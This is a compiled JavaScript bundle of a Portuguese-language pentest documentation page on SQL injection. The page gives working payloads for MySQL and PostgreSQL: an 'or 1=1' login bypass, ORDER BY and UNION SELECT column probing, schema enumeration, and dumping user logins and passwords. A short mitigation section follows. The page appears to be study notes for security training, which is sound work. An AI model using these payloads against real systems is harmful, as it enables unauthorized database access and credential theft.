"use strict";(self.webpackChunkmy_docs=self.webpackChunkmy_docs||[]).push([[6720],{3905:(e,o,n)=>{n.d(o,{Zo:()=>u,kt:()=>h});var a=n(7294);function t(e,o,n){return o in e?Object.defineProperty(e,o,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[o]=n,e}function l(e,o){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);o&&(a=a.filter((function(o){return Object.getOwnPropertyDescriptor(e,o).enumerable}))),n.push.apply(n,a)}return n}function r(e){for(var o=1;o<arguments.length;o++){var n=null!=arguments[o]?arguments[o]:{};o%2?l(Object(n),!0).forEach((function(o){t(e,o,n[o])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(o){Object.defineProperty(e,o,Object.getOwnPropertyDescriptor(n,o))}))}return e}function i(e,o){if(null==e)return{};var n,a,t=function(e,o){if(null==e)return{};var n,a,t={},l=Object.keys(e);for(a=0;a<l.length;a++)n=l[a],o.indexOf(n)>=0||(t[n]=e[n]);return t}(e,o);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(a=0;a<l.length;a++)n=l[a],o.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(t[n]=e[n])}return t}var s=a.createContext({}),d=function(e){var o=a.useContext(s),n=o;return e&&(n="function"==typeof e?e(o):r(r({},o),e)),n},u=function(e){var o=d(e.components);return a.createElement(s.Provider,{value:o},e.children)},p="mdxType",c={inlineCode:"code",wrapper:function(e){var o=e.children;return a.createElement(a.Fragment,{},o)}},m=a.forwardRef((function(e,o){var n=e.components,t=e.mdxType,l=e.originalType,s=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),p=d(n),m=t,h=p["".concat(s,".").concat(m)]||p[m]||c[m]||l;return n?a.createElement(h,r(r({ref:o},u),{},{components:n})):a.createElement(h,r({ref:o},u))}));function h(e,o){var n=arguments,t=o&&o.mdxType;if("string"==typeof e||t){var l=n.length,r=new Array(l);r[0]=m;var i={};for(var s in o)hasOwnProperty.call(o,s)&&(i[s]=o[s]);i.originalType=e,i[p]="string"==typeof e?e:t,r[1]=i;for(var d=2;d<l;d++)r[d]=n[d];return a.createElement.apply(null,r)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},4882:(e,o,n)=>{n.r(o),n.d(o,{assets:()=>s,contentTitle:()=>r,default:()=>c,frontMatter:()=>l,metadata:()=>i,toc:()=>d});var a=n(7462),t=(n(7294),n(3905));const l={id:"sqli",title:"SQL Injection"},r="SQL Injection",i={unversionedId:"pentest/sqli",id:"pentest/sqli",title:"SQL Injection",description:"O SQL Injection \xe9 uma vulnerabilidade de seguran\xe7a que ocorre quando um",source:"@site/docs/pentest/sqli.mdx",sourceDirName:"pentest",slug:"/pentest/sqli",permalink:"/my-docs/docs/pentest/sqli",draft:!1,tags:[],version:"current",frontMatter:{id:"sqli",title:"SQL Injection"},sidebar:"tutorialSidebar",previous:{title:"ParamSpider",permalink:"/my-docs/docs/pentest/paramspider"},next:{title:"subfinder",permalink:"/my-docs/docs/pentest/subfinder"}},s={},d=[{value:"Conceito B\xe1sico",id:"conceito-b\xe1sico",level:2},{value:"Exemplos de SQL Injection",id:"exemplos-de-sql-injection",level:2},{value:"SQLi B\xe1sico",id:"sqli-b\xe1sico",level:3},{value:"Limitando o N\xfamero de Sa\xeddas",id:"limitando-o-n\xfamero-de-sa\xeddas",level:3},{value:"Descobrindo o N\xfamero de Colunas",id:"descobrindo-o-n\xfamero-de-colunas",level:3},{value:"Descobrindo o N\xfamero de Colunas usando UNION SELECT",id:"descobrindo-o-n\xfamero-de-colunas-usando-union-select",level:3},{value:"Obtendo Informa\xe7\xf5es do Banco de Dados",id:"obtendo-informa\xe7\xf5es-do-banco-de-dados",level:3},{value:"Efetuando um Dump de Dados",id:"efetuando-um-dump-de-dados",level:3},{value:"Exibindo Mais de uma Informa\xe7\xe3o por Vez",id:"exibindo-mais-de-uma-informa\xe7\xe3o-por-vez",level:3},{value:"SQL Injection (Blind)",id:"sql-injection-blind",level:2},{value:"Exemplos de SQL Injection Blind",id:"exemplos-de-sql-injection-blind",level:3},{value:"SQL Injection no PostgreSQL",id:"sql-injection-no-postgresql",level:2},{value:"Descobrindo o n\xfamero de colunas",id:"descobrindo-o-n\xfamero-de-colunas-1",level:3},{value:"Descobrindo o n\xfamero de colunas atrav\xe9s do UNION SELECT",id:"descobrindo-o-n\xfamero-de-colunas-atrav\xe9s-do-union-select",level:3},{value:"Validando a coluna para obter informa\xe7\xf5es",id:"validando-a-coluna-para-obter-informa\xe7\xf5es",level:3},{value:"Enumerando informa\xe7\xf5es do banco de dados",id:"enumerando-informa\xe7\xf5es-do-banco-de-dados",level:3},{value:"Extraindo dados",id:"extraindo-dados",level:3},{value:"Mitiga\xe7\xe3o de SQL Injection",id:"mitiga\xe7\xe3o-de-sql-injection",level:2}],u={toc:d},p="wrapper";function c(e){let{components:o,...n}=e;return(0,t.kt)(p,(0,a.Z)({},u,n,{components:o,mdxType:"MDXLayout"}),(0,t.kt)("h1",{id:"sql-injection"},"SQL Injection"),(0,t.kt)("p",null,"O SQL Injection \xe9 uma vulnerabilidade de seguran\xe7a que ocorre quando um\naplicativo web n\xe3o valida corretamente as entradas do usu\xe1rio e permite que um\ninvasor insira comandos SQL maliciosos. Com essa brecha, um atacante pode\nmanipular consultas SQL para acessar, alterar ou excluir informa\xe7\xf5es no banco de\ndados, comprometendo a integridade e confidencialidade dos dados armazenados."),(0,t.kt)("hr",null),(0,t.kt)("h2",{id:"conceito-b\xe1sico"},"Conceito B\xe1sico"),(0,t.kt)("p",null,"SQL, que significa Structured Query Language, \xe9 uma linguagem utilizada para\ngerenciar bancos de dados, mas n\xe3o \xe9 o banco de dados em si. Os principais\nbancos de dados que utilizam SQL incluem:"),(0,t.kt)("ul",null,(0,t.kt)("li",{parentName:"ul"},"Oracle"),(0,t.kt)("li",{parentName:"ul"},"SQL Server"),(0,t.kt)("li",{parentName:"ul"},"MySQL"),(0,t.kt)("li",{parentName:"ul"},"DB2"),(0,t.kt)("li",{parentName:"ul"},"PostgreSQL")),(0,t.kt)("h2",{id:"exemplos-de-sql-injection"},"Exemplos de SQL Injection"),(0,t.kt)("h3",{id:"sqli-b\xe1sico"},"SQLi B\xe1sico"),(0,t.kt)("p",null,"Na forma mais b\xe1sica de SQL Injection, o invasor insere dados maliciosos em um\nformul\xe1rio ou atrav\xe9s de par\xe2metros na URL para manipular consultas. Por\nexemplo:"),(0,t.kt)("ul",null,(0,t.kt)("li",{parentName:"ul"},(0,t.kt)("p",{parentName:"li"},"Preenchimento no formul\xe1rio:"),(0,t.kt)("pre",{parentName:"li"},(0,t.kt)("code",{parentName:"pre"},"teste' or 1=1;#\n"))),(0,t.kt)("li",{parentName:"ul"},(0,t.kt)("p",{parentName:"li"},"M\xe9todo GET via URL:"),(0,t.kt)("pre",{parentName:"li"},(0,t.kt)("code",{parentName:"pre"},"http://intranet.businesscorp.com.br:8080/cat.php?id=3 or 1=1;#\n")))),(0,t.kt)("h3",{id:"limitando-o-n\xfamero-de-sa\xeddas"},"Limitando o N\xfamero de Sa\xeddas"),(0,t.kt)("p",null,"\xc9 poss\xedvel limitar o n\xfamero de sa\xeddas usando a cl\xe1usula ",(0,t.kt)("inlineCode",{parentName:"p"},"LIMIT")," em conjunto com\nSQL Injection. Por exemplo:"),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},"teste' or 1=1 limit 1;#\n")),(0,t.kt)("h3",{id:"descobrindo-o-n\xfamero-de-colunas"},"Descobrindo o N\xfamero de Colunas"),(0,t.kt)("p",null,"Para descobrir o n\xfamero de colunas em uma tabela, pode-se fazer tentativas\nincrementais na cl\xe1usula ",(0,t.kt)("inlineCode",{parentName:"p"},"ORDER BY")," at\xe9 que um erro ocorra. Por exemplo:"),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},"http://<host>/cat.php?id=-1 order by 1\nhttp://<host>/cat.php?id=-1 order by 2\nhttp://<host>/cat.php?id=-1 order by 3\nhttp://<host>/cat.php?id=-1 order by 4\nhttp://<host>/cat.php?id=-1 order by 5 (Com erro - tabela possui 4 colunas)\n")),(0,t.kt)("h3",{id:"descobrindo-o-n\xfamero-de-colunas-usando-union-select"},"Descobrindo o N\xfamero de Colunas usando UNION SELECT"),(0,t.kt)("p",null,"Outra maneira de descobrir o n\xfamero de colunas \xe9 atrav\xe9s do uso da cl\xe1usula\n",(0,t.kt)("inlineCode",{parentName:"p"},"UNION SELECT"),". Por exemplo:"),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},"http://<host>/cat.php?id=-1 union select 1\nhttp://<host>/cat.php?id=-1 union select 1,2\nhttp://<host>/cat.php?id=-1 union select 1,2,3\nhttp://<host>/cat.php?id=-1 union select 1,2,3,4 (Com erro - tabela possui 4 colunas)\n")),(0,t.kt)("h3",{id:"obtendo-informa\xe7\xf5es-do-banco-de-dados"},"Obtendo Informa\xe7\xf5es do Banco de Dados"),(0,t.kt)("p",null,"Uma vez que o n\xfamero de colunas \xe9 conhecido, pode-se obter informa\xe7\xf5es do banco\nde dados, como a vers\xe3o do MySQL, o nome do banco de dados, os usu\xe1rios atuais,\nas tabelas existentes e suas colunas. Por exemplo:"),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},'http://<host>/cat.php?id=-1 union select 1,@@version,3,4\nhttp://<host>/cat.php?id=-1 union select 1,database(),3,4\nhttp://<host>/cat.php?id=-1 union select 1,current_user(),3,4\nhttp://<host>/cat.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata\nhttp://<host>/cat.php?id=-1 union select 1,table_name,3,4 from information_schema.tables;\nhttp://<host>/cat.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema="nome_do_db";\nhttp://<host>/cat.php?id=-1 union select 1,column_name,3,4 from information_schema.columns where table_schema="nome_do_db" and table_name="nome_tabela";\n')),(0,t.kt)("h3",{id:"efetuando-um-dump-de-dados"},"Efetuando um Dump de Dados"),(0,t.kt)("p",null,"Uma vez que se sabe o nome da tabela e das colunas, pode-se efetuar um dump de\ndados do banco de dados. Por exemplo:"),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},"http://<host>/cat.php?id=-1 union select 1,login,3,4 from users;\nhttp://<host>/cat.php?id=-1 union select 1,password,3,4 from users;\n")),(0,t.kt)("h3",{id:"exibindo-mais-de-uma-informa\xe7\xe3o-por-vez"},"Exibindo Mais de uma Informa\xe7\xe3o por Vez"),(0,t.kt)("p",null,"Tamb\xe9m \xe9 poss\xedvel combinar informa\xe7\xf5es em uma \xfanica sa\xedda. Por exemplo:"),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},"http://<host>/cat.php?id=-1 union select 1,concat(login,':',password),3,4 from users;\n")),(0,t.kt)("h2",{id:"sql-injection-blind"},"SQL Injection (Blind)"),(0,t.kt)("p",null,"O SQL Injection Blind ocorre quando a aplica\xe7\xe3o n\xe3o exibe mensagens de erro ou\ninforma\xe7\xf5es \xfateis para o invasor. Ele precisa usar a l\xf3gica booleana para\ninferir se as consultas s\xe3o verdadeiras ou falsas."),(0,t.kt)("h3",{id:"exemplos-de-sql-injection-blind"},"Exemplos de SQL Injection Blind"),(0,t.kt)("ul",null,(0,t.kt)("li",{parentName:"ul"},(0,t.kt)("p",{parentName:"li"},"Verificando o n\xfamero de colunas:"),(0,t.kt)("pre",{parentName:"li"},(0,t.kt)("code",{parentName:"pre"},"1' and 1=1 order by 1# (Com retorno da aplica\xe7\xe3o)\n1' and 1=1 order by 2# (Com retorno da aplica\xe7\xe3o)\n1' and 1=1 order by 3# (Sem retorno da aplica\xe7\xe3o - duas colunas)\n"))),(0,t.kt)("li",{parentName:"ul"},(0,t.kt)("p",{parentName:"li"},"Obtendo informa\xe7\xf5es do banco de dados:"),(0,t.kt)("pre",{parentName:"li"},(0,t.kt)("code",{parentName:"pre"},"1' and 1=1 union select 'null',null,null,null (Com erro)\n1' and 1=1 union select null,'null',null,null (Sem erro)\n")))),(0,t.kt)("h2",{id:"sql-injection-no-postgresql"},"SQL Injection no PostgreSQL"),(0,t.kt)("p",null,"Abaixo est\xe3o algumas t\xe9cnicas comuns de SQL Injection no PostgreSQL."),(0,t.kt)("h3",{id:"descobrindo-o-n\xfamero-de-colunas-1"},"Descobrindo o n\xfamero de colunas"),(0,t.kt)("p",null,"Para determinar o n\xfamero de colunas em uma tabela, o invasor pode usar a\ncl\xe1usula ",(0,t.kt)("inlineCode",{parentName:"p"},"order by")," e incrementar o valor at\xe9 encontrar o primeiro erro."),(0,t.kt)("p",null,"Exemplo:"),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},"http://<host>/cat.php?id=-1 order by 1 (Sem erro)\nhttp://<host>/cat.php?id=-1 order by 2 (Sem erro)\nhttp://<host>/cat.php?id=-1 order by 3 (Sem erro)\nhttp://<host>/cat.php?id=-1 order by 4 (Sem erro)\nhttp://<host>/cat.php?id=-1 order by 5 (Com erro)\n")),(0,t.kt)("p",null,"Neste caso, a tabela possui 4 colunas."),(0,t.kt)("h3",{id:"descobrindo-o-n\xfamero-de-colunas-atrav\xe9s-do-union-select"},"Descobrindo o n\xfamero de colunas atrav\xe9s do UNION SELECT"),(0,t.kt)("p",null,"O invasor pode usar a t\xe9cnica UNION SELECT para determinar o n\xfamero de colunas\nem uma consulta."),(0,t.kt)("p",null,"Exemplo:"),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},"http://<host>/cat.php?id=-1 union select null (Com erro)\nhttp://<host>/cat.php?id=-1 union select null,null (Com erro)\nhttp://<host>/cat.php?id=-1 union select null,null,null (Com erro)\nhttp://<host>/cat.php?id=-1 union select null,null,null,null (Sem erro)\nhttp://<host>/cat.php?id=-1 union select null,null,null,null,null (Com erro)\n")),(0,t.kt)("p",null,"Nesse caso, a tabela possui 4 colunas."),(0,t.kt)("h3",{id:"validando-a-coluna-para-obter-informa\xe7\xf5es"},"Validando a coluna para obter informa\xe7\xf5es"),(0,t.kt)("p",null,"Ap\xf3s determinar o n\xfamero de colunas, o invasor pode validar qual coluna cont\xe9m\ninforma\xe7\xf5es relevantes para a extra\xe7\xe3o."),(0,t.kt)("p",null,"Exemplo:"),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},"http://<host>/cat.php?id=-1 union select 'null',null,null,null (Com erro)\nhttp://<host>/cat.php?id=-1 union select null,'null',null,null (Sem erro)\nhttp://<host>/cat.php?id=-1 union select null,null,'null',null (Com erro)\nhttp://<host>/cat.php?id=-1 union select null,null,null,'null' (Com erro)\n")),(0,t.kt)("p",null,"Neste caso, a aplica\xe7\xe3o replica a informa\xe7\xe3o na p\xe1gina atrav\xe9s do campo dois."),(0,t.kt)("h3",{id:"enumerando-informa\xe7\xf5es-do-banco-de-dados"},"Enumerando informa\xe7\xf5es do banco de dados"),(0,t.kt)("p",null,"Uma vez que o invasor determinou as colunas relevantes, ele pode prosseguir para\nobter informa\xe7\xf5es do banco de dados."),(0,t.kt)("ul",null,(0,t.kt)("li",{parentName:"ul"},"Verificar todos os bancos de dados:")),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},"http://<host>/cat.php?id=-1 union select null,datname,null,null from pg_database;\n")),(0,t.kt)("ul",null,(0,t.kt)("li",{parentName:"ul"},"Verificar todas as tabelas:")),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},"http://<host>/cat.php?id=-1 union select null,tablename,null,null from pg_tables;\nhttp://<host>/cat.php?id=-1 union select null,table_name,null,null from information_schema.tables;\n")),(0,t.kt)("ul",null,(0,t.kt)("li",{parentName:"ul"},"Verificar as tabelas em um banco de dados espec\xedfico:")),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},"http://<host>/cat.php?id=-1 union select null,table_name,null,null from information_schema.tables where table_catalog='nome_do_db';\n")),(0,t.kt)("ul",null,(0,t.kt)("li",{parentName:"ul"},"Verificar as colunas de uma tabela:")),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},"http://<host>/cat.php?id=-1 union select null,column_name,null,null from information_schema.columns where table_name='nome_da_tabela';\n")),(0,t.kt)("h3",{id:"extraindo-dados"},"Extraindo dados"),(0,t.kt)("p",null,"Uma vez que o invasor conhece o nome da tabela e das colunas, pode efetuar um dump de dados sens\xedveis."),(0,t.kt)("p",null,"Exemplo:"),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre"},"http://<host>/cat.php?id=-1 union select null,login,null,null from users;\nhttp://<host>/cat.php?id=-1 union select null,password,null,null from users;\n")),(0,t.kt)("h2",{id:"mitiga\xe7\xe3o-de-sql-injection"},"Mitiga\xe7\xe3o de SQL Injection"),(0,t.kt)("p",null,"Para evitar SQL Injection, \xe9 fundamental adotar pr\xe1ticas seguras de programa\xe7\xe3o:"),(0,t.kt)("ul",null,(0,t.kt)("li",{parentName:"ul"},"Use consultas parametrizadas (prepared statements) ou ORM (Object-Relational\nMapping) para evitar a inser\xe7\xe3o direta de dados do usu\xe1rio nas consultas SQL."),(0,t.kt)("li",{parentName:"ul"},"Realize a valida\xe7\xe3o e sanitiza\xe7\xe3o adequada de todas as entradas do usu\xe1rio\nantes de incorpor\xe1-las em consultas SQL."),(0,t.kt)("li",{parentName:"ul"},"Limite os privil\xe9gios de acesso do usu\xe1rio do banco de dados para minimizar os\ndanos em caso de explora\xe7\xe3o bem-sucedida."),(0,t.kt)("li",{parentName:"ul"},"Mantenha o software do banco de dados e do aplicativo atualizado com as\n\xfaltimas corre\xe7\xf5es de seguran\xe7a."),(0,t.kt)("li",{parentName:"ul"},"Monitore os logs do aplicativo e do banco de dados em busca de atividades\nsuspeitas.")),(0,t.kt)("p",null,"Ao seguir essas pr\xe1ticas, \xe9 poss\xedvel reduzir significativamente o risco de SQL\nInjection no PostgreSQL."))}c.isMDXComponent=!0}}]);